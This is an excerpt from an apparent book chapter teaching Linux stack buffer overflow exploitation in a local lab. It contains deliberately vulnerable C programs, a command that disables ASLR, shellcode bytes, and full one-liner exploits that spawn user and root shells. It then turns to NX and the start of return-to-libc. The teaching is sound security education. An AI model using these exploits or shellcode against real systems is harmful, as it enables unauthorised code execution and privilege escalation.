Chapter 2. Vulnerabilities
================================================================================

*Currently writing a book about finding, exploiting, and preventing vulnerabilities in Linux applications. Here's an excerpt.*

In this chapter we will look at vulnerability classes, how these can be exploited, and the countermeasures that retire old exploitation techniques and give birth to new ones.

Buffer overflow
--------------------------------------------------------------------------------

A buffer overflow is a very common type of vulnerability that allows a buffer to be overfilled. This can lead to a program crash, undefined behavior or exploitation by a malicious actor.

### Technical details

Buffers are used to store and access data in memory. An example of a buffer is an array in a C program storing the results of a mathematical operation.

In C, an array is typically declared with a type and a number of elements:

```c
int numdata[100];
```

The above declaration will allocate a contigous block of memory on the stack capable of holding 100 integers. As we saw in a previous chapter, the stack grows from high addresses to low, and data is stored in little endian format, so the stack will look something look like this:

```
high addresses
    ===============
    |     ...     |
    |-------------|
    |     ...     |
    |-------------|
    |    0x...    | <- return address
    |-------------|
    |    0x...    | <- saved frame pointer
    |-------------| <- bottom of stack
    | numdata[99] |
    |-------------|
    | numdata[98] |
    |-------------|
          ...
    |-------------|
    | numdata[0]  |
    |-------------| <- top of stack
    |   |  |  |   |
    |   v  v  v   |
    ===============
low addresses
```

When a buffer overflows, we can see from the stack above that the saved frame pointer is overwritten first, then the return address, and then other stack data.

A program will typically crash if the buffer overflow happens by accident, since the return address has been overwritten by data that is unlikely to be a valid address to a valid instruction, or because other required data on the stack has been corrupted. But if the data written to the array comes from for example user input, a file read or a network client, a malicious actor may exploit the buffer overflow to take complete control of the program's execution.

> When a vulnerable program runs with high privileges, exploitation may give the attacker full control of the running system.

A buffer overflow vulnerability gives us the possibility to crash or manipulate a program, but the real power comes from the ability to overwrite the return address to anything we desire.

There are a lot of factors that can result in an exploitable buffer overflow vulnerability, including the programming language used (and the use of unsafe libraries), not sanitizing input, and a programmers lack of security skill or security focus.

### Old School exploitation

Years ago, the way to exploit a buffer overflow vulerability was to input data so that the vulnerable buffer contained the code we wanted to execute (typically a shell), and that the return address was overwritten to point to our injected code. When the vulnerable function returned, the *shellcode* was executed.

Even though modern systems may not permit such attacks anymore, this is the best place to start learning about buffer overflow attacks, as we cover the basics that we'll use in more advanced attacks against modern systems.


Consider the following vulnerable program:

```c
/*
 * bo_vuln1.c
 * gcc bo_vuln1.c -zexecstack -fno-stack-protector -g -o bo_vuln1
 */

#include <string.h>

void cp(char *s)
{
    char input[74];
    strcpy(input, s);
}

int main(int argc, char *argv[])
{
    if (argc > 1)
        cp(argv[1]);
    return 0;
}
```

The program takes user input and writes it uncritically to a small buffer, making it obviously vulnerable to a buffer overflow attack.

Notice that the program is compiled with some security functions disabled. These are enabled by default on most modern systems. If you want to follow along, be sure to also disable a security function called ASLR on your system:

```bash
$ sudo sh -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
```

> We will look at all these disabled countermeasures in detail later.

On my 64-bit system, the program seems to work flawlessly when the user input is short, but will crash when given a long input string:

```bash
$ ./bo_vuln1 aaaa
$ ./bo_vuln1 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault (core dumped)
```

> Tip: In a bash shell, use alt-*N* followed by a character to print *N* characters to the screen.

`gdb` can be used to investigate what happens:

```bash
$ gdb bo_vuln1
```

View the disassembly, and break before the call to `strcpy`:

```bash
(gdb) disas cp
Dump of assembler code for function cp:
   0x0000000000401126 <+0>:     push   %rbp
   0x0000000000401127 <+1>:     mov    %rsp,%rbp
   0x000000000040112a <+4>:     sub    $0x60,%rsp
   0x000000000040112e <+8>:     mov    %rdi,-0x58(%rbp)
   0x0000000000401132 <+12>:    mov    -0x58(%rbp),%rdx
   0x0000000000401136 <+16>:    lea    -0x50(%rbp),%rax
   0x000000000040113a <+20>:    mov    %rdx,%rsi
   0x000000000040113d <+23>:    mov    %rax,%rdi
   0x0000000000401140 <+26>:    callq  0x401030 <strcpy@plt>
   0x0000000000401145 <+31>:    nop
   0x0000000000401146 <+32>:    leaveq
   0x0000000000401147 <+33>:    retq
End of assembler dump.
(gdb) b *cp+26
Breakpoint 2 at 0x40116b: file bo_vuln1.c, line 13.
```

> In gdb `disas` is short for `disassemble`, `r` for `run`, `b` for `break`.

We can see from the assembly code above that the first argument to the `strcpy`, which a man-page would reveal to be the *destination buffer* of the copy operation, is 0x50 bytes from the base. So the buffer is 80 bytes, not 74 bytes as declared in the program code. This is done by the compiler because of alignment requirements.

> The value put in `%rdi` before the call to the function is the first argument of the function in x86_64 assembly.

If there are other variables on the stack, the above method may not yield the size of the buffer, but the number of bytes from the beginning of the buffer until the saved frame pointer (which is what we are interested in anyway).

To overwrite to return address we need to fill the buffer (80 bytes), overwrite the saved frame pointer (8 bytes), and finally overwrite ret (8 bytes).

Run to program with 80 a's, 8 b's and 8 c's:

```bash
(gdb) r aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbcccccccc
...
Breakpoint 1, 0x0000000000401140 in cp (
    s=0x7fffffffda7b 'a' <repeats 80 times>, "bbbbbbbbcccccccc") at bo_vuln1.c:11
    11          strcpy(input, s);
```

Because of our set breakpoint, the program is paused before the call to `strcpy`. Let's examine the stack:

```bash
(gdb) x/96xb $rbp-0x50
0x7fffffffd5a0: 0x0b    0x00    0x00    0x00    0x00    0x00    0x00    0x00
...
0x7fffffffd5e8: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffd5f0: 0x10    0xd6    0xff    0xff    0xff    0x7f    0x00    0x00
0x7fffffffd5f8: 0x70    0x11    0x40    0x00    0x00    0x00    0x00    0x00
```

The first line above is the start of the buffer. The saved base pointer and the return address are on the last two lines.

> You can confirm that the last line is indeed the return pointer by dissassembling the main function and observing that the address on the last line is the address of the instruction following the call to the `cp` function.

Here's the stack after `strcpy` has returned:

```bash
(gdb) ni
12      }
(gdb) x/96xb $rbp-0x50
0x7fffffffd5a0: 0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
...
0x7fffffffd5e8: 0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffd5f0: 0x62    0x62    0x62    0x62    0x62    0x62    0x62    0x62
0x7fffffffd5f8: 0x63    0x63    0x63    0x63    0x63    0x63    0x63    0x63
```

The buffer is now filled with a's (0x61), the saved frame pointer and return address are overwritten by b's (0x62) and c's (0x63), respectively.

From our earlier disassembly of `cp`, we know three instructions remain: `nop`, `leaveq` and `retq`. We will continue our examination after `leaveq`, which will pop the saved frame pointer into the `%rbp` register:

```bash
(gdb) si 2
0x0000000000401147      12      }
(gdb) i r $rbp
rbp            0x6262626262626262  0x6262626262626262
```

The b's we input is now the value of the base pointer. Let's see what happens when `retq` tries to return to the "0x6363..." address:

```
(gdb) si
Program received signal SIGSEGV, Segmentation fault.
...
(gdb) i r $rip
rip            0x401147            0x401147 <cp+33>
```

The program crashes. Note that the instruction pointer is unchanged, still pointing to the `ret` instruction of `cp`. If you run the `bt` command in gdb, it is clear that the next return address is "0x6363...". The reason the program crashes is that the address is to large.

Try giving the same input as before, but reducing the number of c's to 4. The instruction pointer is successfully changed, but the program still crashes since it will try to return to 0x0000000063636363.

Next, instead of writing junk to the stack, we will exploit the vulnerability to get a shell.

#### Getting a shell in gdb

Continuing to work in gdb, this is what we want the stack to look like for successful exploitation.

```
top of stack
===================================
shellcode                       <----o
shellcode                            |
...                                  |
shellcode                            |
==================================   |
junk (saved frame pointer)           |
==================================   |
ret pointing to start of shellcode --o
==================================
bottom of stack
```

To turn the stack into the above, we'll start with the shellcode. The writing of shellcode will be covered later, for now we can grab a working shellcode from shell-storm.org/shellcode.

> I've chosen the 33 byte Linux x86_64 `execve(/bin/sh, [/bin/sh], NULL)` by hophet, available at http://shell-storm.org/shellcode/files/shellcode-76.php

The bytes of the shellcode are as follows:

```
\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05
```

We need to fill the buffer with 80 bytes, but our shellcode is only 33 bytes. What should the rest be filled with?

A really good choice is to prefix our shellcode with a NOP-sled and postfix it with anything.

A NOP is an assembly instruction that performs no operation. A NOP-sled is a neat trick that makes it easier to "hit" our shellcode with the address we'll overwrite ret with. The address of the buffer can vary based on a lot of factors, so a NOP-sled will increase our chances of not jumping outside or in the middle of our shellcode.

> A NOP instruction has byte value 0x90 in x86 assembly.

> If we know the precise location of the buffer, the NOP-sled is redundant (but not a problem).

The reason we want to postfix our shellcode is to keep it away from `$rbp` (remember that `$rbp` becomes the `$rsp` of a function we return to), because when our shellcode executes, some of it's instructions may push things onto the stack, overwriting parts of itself. Postfixing the shellcode with junk helps prevents this.

Here's one possible input to exploit the vulnerable program:

```
| 30 NOP's | 33 byte shellcode | 17 a's | 8 b's | 8 byte ret |
```

The ret should be to somewhere in our NOP-sled (find the address of the buffer by looking at the assembly or at the stack and add some bytes). I've chosen 0x7fffffffd5a8 on my system.

We can use python to help us input the exploit code:

```
(gdb) run `python -c 'print 30 * "\x90" + "\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05" + 17 * "a" + 8 * "b" + "\xa8\xd5\xff\xff\xff\x7f"'`
```

The program pauses at the breakpoint we set before `strcpy`. Let's go to the next instruction and examine the stack:

```bash
(gdb) ni
(gdb) x/96xb $rbp-0x50
0x7fffffffd5a0: 0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0x7fffffffd5a8: 0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0x7fffffffd5b0: 0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0x7fffffffd5b8: 0x90    0x90    0x90    0x90    0x90    0x90    0x48    0x31
0x7fffffffd5c0: 0xd2    0x48    0xbb    0xff    0x2f    0x62    0x69    0x6e
0x7fffffffd5c8: 0x2f    0x73    0x68    0x48    0xc1    0xeb    0x08    0x53
0x7fffffffd5d0: 0x48    0x89    0xe7    0x48    0x31    0xc0    0x50    0x57
0x7fffffffd5d8: 0x48    0x89    0xe6    0xb0    0x3b    0x0f    0x05    0x61
0x7fffffffd5e0: 0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffd5e8: 0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffd5f0: 0x62    0x62    0x62    0x62    0x62    0x62    0x62    0x62
0x7fffffffd5f8: 0xa8    0xd5    0xff    0xff    0xff    0x7f    0x00    0x00
```

The buffer starts with the NOP-sled followed by the shellcode and padding junk. `ret` (on the last line) points inside the NOP-sled.

Now, delete all breakpoints, and continue the execution:

```bash
(gdb) d
(gdb) c
Continuing.
process 11057 is executing new program: /usr/bin/bash
sh-4.4$ 
```

We got a shell! 

Next, we'll leave gdb and try to exploit the program in a terminal.


#### Getting a shell in a terminal

Run the program with the same input as given in gdb:

```bash
$ ./bo_vuln1 `python -c 'print 30 * "\x90" + "\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05" + 17 * "a" + 8 * "b" + "\xa8\xd5\xff\xff\xff\x7f"'`
Segmentation fault (core dumped)
```

A failure!

This happens because gdb and various terminals have a different number of environment variables resulting in non-equal stack addresses. Environment variables push the stack higher towards lower addresses.

We got two choices:

1) Keep guessing the ret address until we hit our NOP-sled.
2) Make sure gdb and terminals have the same stack addresses.

Choice number 1 will can be tedious since our program has a pretty small NOP-sled.

Choice number 2 is more interesting. The following program will be used to illustrate the differences in the stack addresses:

```c
/*
 * address.c
 * gcc address.c -o address -std=c99
 */

#include <stdio.h>

int main()
{
    int buffer[50];
    printf("Address of buffer: %p\n", (void *)&buffer);
}
```

Note the address in gdb:

```bash
$ gdb address
(gdb) run
Address of buffer: 0x7fffffffd5b0
```

Then look at the address in a terminal:

```bash
$ ./address
Address of buffer: 0x7fffffffd5e0
```

gdb has 48 bytes more environment variables in memory, but note that this is not a static difference between the stack addresses in the terminal or in gdb.

> Try running `address` from a different terminal or with a different working directory to confirm that the address changes. You can use `env` to examine the environment in terminals and `show env` in gdb.

To make sure gdb and terminals have the same addresses, do the following:

1) Run gdb with an empty enviroment and unset its special environment variables:

```bash
$ env - gdb address
(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) r
Address of buffer: 0x7fffffffec30
```

2) Run programs in terminal with an empty environment, set `$PWD` and `$SHLVL` and use the full path of the program:

```
$ env - PWD=$PWD SHLVL=0 /path/to/address
Address of buffer: 0x7fffffffec30
```

Notice that the address is now the same.

Go back into gdb using the above method, and find the address of the buffer:

```bash
$ env - gdb address
(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) b *cp+26
Breakpoint 1 at 0x401140: file bo_vuln1.c, line 11.
(gdb) r aaa
Breakpoint 1, 0x0000000000401140 in cp (s=0x7fffffffef9d "aaa") at bo_vuln1.c:11
...
(gdb) p $rbp-0x50
$1 = (void *) 0x7fffffffec90
```

> Since our program is compiled with debugging information (`-g`), we could get the address by using `p &input` in gdb.

Modify the exploit to jump into the NOP-sled, and run the program in the terminal:

```bash
$ env - PWD=$PWD SHLVL=0 /path/to/bo_vuln1 `python -c 'print 30 * "\x90" + "\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05" + 17 * "a" + 8 * "b" + "\x98\xec\xff\xff\xff\x7f"'`
Segmentation fault (core dumped)
```

Still no success. One final obstacle remains: our argument to the program moves to buffer address.

We know we are inputting 96 characters the program (to fill the buffer and overwrite two addresses), so our buffer address will be 96 bytes offset from our gdb result above.

A quick calculation gives 0x90 - 0x60 = 0x30 (the first number is the last byte of the buffer address that we got from gdb, and the second number is 96 converted to hex) and we are ready to exploit again:

```bash
$ env - PWD=$PWD SHLVL=0 /path/to/bo_vuln1 `python -c 'print 30 * "\x90" + "\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05" + 17 * "a" + 8 * "b" + "\x38\xec\xff\xff\xff\x7f"'`
sh-4.4$
```

> We can use `$PWD/program` instead of `/path/to/program`.

Finally a success!

To summarize: make sure to launch gdb and the vulnerable programs as described above, and take the argument length into account to find the proper buffer address in the terminal.

### Getting a root shell

The vulnerable program above spawned a shell when we exploited it, but the shell did not get us any special permissions. That's to be expected, as the vulnerable program ran with normal user privileges.

There are multiple ways to go from normal user privilege to super user privilege, and we'll look more at this later, but for now we'll focus on SUID binaries.

#### SUID binaries

When root is the owner of a file, and the SUID/setuid bit is set, the program runs (when executed by a normal user) with the highest privlege.

To turn `bo_vuln1` into a SUID root binary, we set root as the owner, and set the SUID bit:

```bash
$ sudo chown root bo_vuln1
$ sudo chmod u+s  bo_vuln1
$ ls -l bo_vuln1
-rwsrwxr-x. 1 root cas 19552 Jul 22 17:19 bo_vuln1
```

When we execute the above program, we run it with using our *real* user ID (the user we are logged in as), but the program runs with root as its *effective* user ID.

> The SUID bit makes a program run with the *owner's* privileges.

#### Prevent privilege drop in bash

Running the same exploit as earlier, on the now SUID root `bo_vuln1`, we still get a shell with no special privileges:

```bash
$ env - PWD=$PWD SHLVL=0 $PWD/bo_vuln1 `python -c 'print 30 * "\x90" + "\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05" + 17 * "a" + 8 * "b" + "\x38\xec\xff\xff\xff\x7f"'`
sh-4.4$
```

This happens because bash (and most other modern shells) will set the effective user ID to the real user ID unless we use the `-p`  option, i.e. the root privilege is *dropped*.

> The `-p` option in bash is the same as `-o privileged`.

We can see that this is true by calling `execve` to launch a shell (which is the method used by our shellcode) in a small suid root program:

```c
/*
 * rootsh.c
 * gcc rootsh.c -o rootsh -std=c99
 */

#include <unistd.h>

int main()
{
    execve("/bin/sh", (char *[]){"/bin/sh", "-p", NULL}, NULL);
}
```

After compiling, set root as owner, and set the setuid bit:

```
$ sudo chown root rootsh
[sudo] password for <user>:
$ sudo chmod u+s rootsh
$ ls -l rootsh
-rwsrwxr-x. 1 root cas 18288 Aug  8 21:12 rootsh
```

When the program is executed by a normal user, it spawns a root shell:

```
$ ./rootsh
sh-4.4# whoami
root
sh-4.4#
```

> Delete the file or remove the setuid bit by using `chmod -s <FILE>`. Don't leave vulnerable programs with a SUID bit, it's probably smart the create a "superuser" or similar *normal* user to use as the owner of a SUID file for educational purposes.

On 32-bit systems "/bin/sh -p" shellcode is easy to create since arguments to functions are passed on the stack, but on 64-bit it's difficult since registers are used to pass arguments (the string with the "-p" option is too long for a register).

> We'll look more at the challenges of writing shellcode in a later chapter.

An alternative to using the `-p` option is to use a shellcode which first runs `setuid()` to set the user identity to uid 0 (root), then execute a shell. Let's grab a shellcode from shell-storm.org.

> I've chosen the 48 byte Linux x86_64 `setuid(0) + execve(/bin/sh)` by xi4oyu, available at http://shell-storm.org/shellcode/files/shellcode-77.php. The author did not zero out `rax` before moving the system call number for `execve` into the lower 8 bits of the register, so the call to `setuid` could fail. I've prefixed three bytes in the shellcode below that zeroes out `rax`, making the shellcode 51 bytes.

The bytes of the (fixed) shellcode are as follows:

```
\x48\x31\xc0\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05
```

`bo_vuln1` is still set with root as owner and with the SUID bit. Let's run the shellcode (note that the NOP sled is decreased since the shellcode is longer):

```bash
$ env - PWD=$PWD SHLVL=0 $PWD/bo_vuln1 `python -c 'print 12 * "\x90" + "\x48\x31\xc0\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05" + 17 * "a" + 8 * "b" + "\x38\xec\xff\xff\xff\x7f"'`
sh-4.4# echo $EUID
0
sh-4.4# whoami
root
sh-4.4#
```

> Filesystems mounted with the `nosuid` mount option in (see the file `/proc/mounts`) will ignore the SUID or SGID bit, making this type of privilege escalation impossible.

### Other places to put shellcode

Continuing with old school exploitation, we'll look at a few variations of shellcode injection.

#### Shellcode in an environment variable

Consider the program below:

```c
/*
 * bo_vuln2.c
 * gcc bo_vuln2.c -zexecstack -fno-stack-protector -g -o bo_vuln2
 */

#include <string.h>

void cp(char *s)
{
    char input[8];
    strcpy(input, s);
}

int main(int argc, char *argv[])
{
    if (argc > 1)
        cp(argv[1]);
    return 0;
}
```

> Note that we are still disabling security measures during compilation, and that ASLR needs to be turned off if you want to follow along.

Can this tiny buffer be exploited?

You might think that we can do something like the following:

```
| 8  a's | 8 b's | ret | 50 NOP's | shellcode |
```

Fill buffer, overwrite saved frame pointer, overwrite ret to point to NOP-sled and then follow with our NOP-sled and shellcode. This is not possible because:

- We can't have null bytes in the command line argument since the argv's strings are null-terminated.
- `strcpy` will stop writing after encountering a null byte.

Our shellcode is NULL-free, but ret is not. ret is "0x00007fff..." and the only reason we succeeded modifying it correctly in the earlier example was that ret was the last part of our input string and the stack already contained the necessary null bytes as part of the previous ret address that we overwrote.

> Some programs can be exploited without worrying about null bytes, as we will see later.

But there's a simple solution that will allow us to exploit this tiny buffer to execute a shell, putting the shellcode in an enviroment variable.

Launch gdb with shellcode in an environment variable:

```bash
env - MYSH=`python -c 'print "\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"'` gdb bo_vuln2
(gdb) unset env LINES
(gdb) unset env COLUMNS
```

Find the address of the shellcode:

```bash
(gdb) b main
Breakpoint 1 at 0x401157: file bo_vuln2.c, line 16.
(gdb) r
Breakpoint 1, main (argc=1, argv=0x7fffffffed58) at bo_vuln2.c:16
...
(gdb) x/s *(char **)environ
0x7fffffffef7a: "PWD=/my/current/working/directory"
(gdb) <PRESS RETURN>
0x7fffffffef9f: "MYSH=H1\322H\273\377/bin/shH\301\353\bSH\211\347H1\300PWH\211\346\260;\017\005"
```

> Tip: you can use the gdb `start` command to run the program with a temporary breakpoint at the beginning of main.

The environment variable contains "MYSH=", so we need to add 5 bytes to the address to skip past that part: 0x7fffffffefa4.

Now we can exploit the program in gdb using:

```
(gdb) d
(gdb) r `python -c 'print 16 * "a" + "\x7f\xff\xff\xff\xef\xa4"[::-1]'`
...
process 18513 is executing new program: /usr/bin/bash
sh-4.4$
```

> Tip: Python helps us little-endian (reverse) the address bytes by using `[::-1]`.

And in the terminal:

```
$ env - PWD=$PWD MYSH=`python -c 'print "\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"'` SHLVL=0 $PWD/bo_vuln2 `python -c 'print 16 * "a" + "\x7f\xff\xff\xff\xef\xa4"[::-1]'`
sh-4.4$
```

Note that `$PWD` is set first, `$SHLVL` is set last, and that `$PWD` is used in front of the program to execute it with full path. Also note that our input length does not affect the location of the environment variable, so we don't need to take this into consideration.

> Tip: A huge NOP-sled in front of the shellcode can make *guessing* the correct address easier.

#### Shellcode in command line argument *n*

Another option for exploiting the above program is putting the shellcode in the second command line argument and using the first command line argument to fill the buffer and overwrite ret.

Run the program in gdb using exploit code with dummy ret, break before cp returns to prevent a crash:

```bash
$ env - gdb bo_vuln2
(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) disas cp
...
   0x0000000000401140 <+26>:    callq  0x401030 <strcpy@plt>
   0x0000000000401145 <+31>:    nop
...
(gdb) b *cp+31
(gdb) r `python -c 'print 16 * "a" + "bbbbbbbb" + " " + "\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"'`
```

Note the space (" ") separating the arguments. To find the address of the second argument, we can look at the bytes before `environ`:

```
(gdb) x/64xb *(char **)environ-64
0x7fffffffef61: 0x75    0x6c    0x6e    0x32    0x00    0x61    0x61    0x61
0x7fffffffef69: 0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffef71: 0x61    0x61    0x61    0x61    0x61    0x62    0x62    0x62
0x7fffffffef79: 0x62    0x62    0x62    0x62    0x62    0x00    0x48    0x31
0x7fffffffef81: 0xd2    0x48    0xbb    0xff    0x2f    0x62    0x69    0x6e
0x7fffffffef89: 0x2f    0x73    0x68    0x48    0xc1    0xeb    0x08    0x53
0x7fffffffef91: 0x48    0x89    0xe7    0x48    0x31    0xc0    0x50    0x57
0x7fffffffef99: 0x48    0x89    0xe6    0xb0    0x3b    0x0f    0x05    0x00
```

> `environ` is on the stack before `argv`.

The shellcode starts after the b's and NUL, at 0x7fffffffef7f.

> Since the progam is compiled with debugging information (`-g`), `p argv` shows the *address of the address* to the command line arguments. You can view strings stored at the address with `x/`*N*`s *argv` or by using `p argv[`*N*`]`.

Exploiting in gdb using the correct address:

```bash
$ env - gdb bo_vuln2
(gdb) r `python -c 'print 16 * "a" + "\x7f\xff\xff\xff\xef\x7f"[::-1] + " " + "\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"'`
process 17211 is executing new program: /usr/bin/bash
sh-4.4$
```

And in the terminal:

```bash
$ env - PWD=$PWD SHLVL=0 $PWD/bo_vuln2 `python -c 'print 16 * "a" + "\x7f\xff\xff\xff\xef\x7f"[::-1] + " " + "\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"'`
sh-4.4$
```

### Countermeasure 1: NX bit

The NX bit (no-execute) is a countermeasure that prevents execution of code on the stack. If a program's stack is *not* marked as executable, the exploits we've looked at so far will not work. On modern systems and processors, a non-executable stack is the default.

> No-execute has many names, including *data execution prevention* (DEP), *W^X* and *executable-space protection*.

In the previous section we compiled all our programs with `-zexecstack`. When gcc is given a `-z` followed by a keyword, both are passed directly to the linker. The `execstack` keyword "marks the object as requiring executable stack" (from `ld` manpage).

If we take the bo_vuln1 program from the previous section, and compile it again without the linker keyword, the exploit will stop working:

```bash
$ gcc bo_vuln1.c -fno-stack-protector -g -o bo_vuln1NX
$ ./bovuln1NX <EXPLOIT>
Segmentation fault (core dumped)
```

Since the stack is no longer executable, any attempt to execute code on the stack will fail. This is also true if we put the shellcode in an environment variable, as these are also on the stack.

If you want to know if a file has an executable stack, `readelf` can be of help:

```bash
$ readelf -l bo_vuln1NX | grep -A1 -i stack
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RW     0x10
$ readelf -l bo_vuln1 | grep -A1 -i stack
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RWE    0x10
```

> R is for Readable, W is for Writable and E is for executable.

So now we can't execute code on the stack, but we can still put data there, and we can still overwrite ret. Let's look at exploits that don't require an executable stack space.

### Return-oriented programming (ROP)

Return-oriented programming is about selecting and executing instructions that are already in memory (as part of the program code or linked shared libraries) to perform desired actions, and thereby preventing the need for an executable stack.

To get started with this topic we'll cover the most basic variant, the Return-to-libc attack.

#### Return-to-libc

We will begin with the following 32-bit program:

```c
/*
 * r2l1.c
 * gcc r2l1.c -fno-stack-protector -m32 -o r2l1
 */

#include <stdio.h>

void cp()
{
    char input[25];

    scanf("%s", input);
    printf("The first character was: %c\n", input[0]);
}

int main(int argc, char *argv[])
{
    printf("Input something: ");
    cp();

    return 0;
}
```

> Note that we are still `fno-stack-protector` during compilation, and that ASLR needs to be turned off.

The reason for starting our discussion of ROP with a vulnerable 32-bit program, is that these are a little simpler to exploit using this technique.

Without an executable stack, we can't inject the shellcode onto the stack for execution. For 32-bit binaries, we can instead put proper values on the stack, then jump to libc. An example is using `system()` to launch `/bin/sh`.

The C standard library (`libc`) is linked into all C programs. We can see that this is true for the above program:

```bash
$ ldd r2l1
        linux-gate.so.1 (0xf7fd2000)
        libc.so.6 => /lib/libc.so.6 (0xf7e06000)
        /lib/ld-linux.so.2 (0xf7fd3000)
```

We are going to exploit the buffer overflow vulnerability in the above program by turning the stack into this:


```
high addresses
    ===============
    |     ...     |
    |-------------|
    |    0x...    | <- address to a '/bin/sh' string
    |-------------|
    |    0x...    | <- address that `system()` will return to
    |-------------|
    |    0x...    | <- ret overwritten to address of `system()`
    |-------------|
    | aaaaaaaaaaa | <- overwritten saved frame pointer
    |-------------| <- bottom of stack
    | aaaaaaaaaaa |
    |             |
          ...       <- filled buffer
    |             |
    | aaaaaaaaaaa |
    |-------------| <- top of stack
    |   |  |  |   |
    |   v  v  v   |
    ===============
low addresses
```

The buffer is filled, and the saved frame pointer is overwritten by junk. ret will have the address of `system()`, making this the next function returned to. When `system()` executes, it will take the address of the '/bin/sh' string from the stack and execute it. Afterwards it will return to our specified address. We will use the address of `exit()`, since it allows us a clean exit (we could of course use some garbage value as the return address if we wanted the program to crash).

Open the program in gdb. Disassembling main reveals the number of bytes from the start of the buffer to the saved frame pointer:

```
(gdb) disas main
...
(gdb) disas cp
...
0x0804918f <+9>:     lea    -0x21(%ebp),%eax
0x08049192 <+12>:    push   %eax
0x08049193 <+13>:    push   $0x804a00c
0x08049198 <+18>:    call   0x8049060 <__isoc99_scanf@plt>
...
```

So we need to fill the buffer with 33 bytes, and then 4 bytes to overwrite the saved frame pointer (remember that we are exploiting a 32-bit binary which has 4 byte addresses).

To find the address of `system()` you look at its disassembly using `disas system` in gdb, or more simply do:

```bash
(gdb) print system
$1 = {<text variable, no debug info>} 0xf7e464d0 <system>
```

> You need to run the program in gdb first so that it will load the shared library.

Then do the same for `exit()`:

```bash
(gdb) print exit
$2 = {<text variable, no debug info>} 0xf7e38500 <exit>
```

The address contains a null byte. We can't use it, but looking at the code around exit, we can use the address right before since it's just a nop instruction:

```bash
(gdb) x/5i *exit-1
   0xf7e384ff:  nop
   0xf7e38500 <exit>:   endbr32
   0xf7e38504 <exit+4>: push   %esi
   0xf7e38505 <exit+5>: pop    %esi
```

Finally, we need the address of a '/bin/sh' string. We can be put the string in an environment variable:

```bash
$ env - MYSH=/bin/sh gdb r2l1
(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) start
...
(gdb) x/2s *(char **)environ
0xffffdf98:     "PWD=/my/current/working/directory"
0xffffdfbd:     "MYSH=/bin/sh"
```

